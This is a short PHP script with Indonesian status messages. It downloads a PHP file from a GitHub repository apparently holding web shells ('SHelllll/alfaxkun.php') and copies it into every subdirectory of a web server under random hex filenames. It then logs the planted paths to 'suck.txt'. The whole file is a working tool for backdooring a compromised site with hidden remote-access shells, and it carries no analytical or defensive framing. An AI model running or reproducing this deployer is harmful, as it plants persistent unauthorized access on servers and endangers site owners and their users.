<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$url = 'https://raw.githubusercontent.com/8112005hg/SHelllll/main/alfaxkun.php';
$targetFilename = 'suck.txt';

function uploadToAllSubfolders($path, $content) {
    $uploaded = [];
    $entries = scandir($path);

    foreach ($entries as $entry) {
        if ($entry == '.' || $entry == '..') {
            continue;
        }

        $fullPath = $path . '/' . $entry;

        if (is_dir($fullPath)) {
            $randomName = bin2hex(openssl_random_pseudo_bytes(16)) . '.php';
            $filepath = $fullPath . '/' . $randomName;
            $result = file_put_contents($filepath, $content);

            if ($result === false) {
                echo "Gagal menyimpan konten ke $filepath\n";
            } else {
                $uploaded[] = $filepath;
            }

            $uploaded = array_merge($uploaded, uploadToAllSubfolders($fullPath, $content));
        }
    }

    return $uploaded;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$content = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Curl Error: ' . curl_error($ch);
}

curl_close($ch);

if ($content) {
    $uploaded = uploadToAllSubfolders('.', $content);

    $result = file_put_contents($targetFilename, implode("\n", $uploaded));

    if ($result === false) {
        echo "Gagal menyimpan URL yang berhasil diunggah ke $targetFilename.";
    } else {
        echo "Berhasil mengunggah file ke semua folder dan menyimpan URL yang berhasil diunggah ke $targetFilename.";
    }
} else {
    echo "Gagal mengambil konten dari $url.";
}
?>
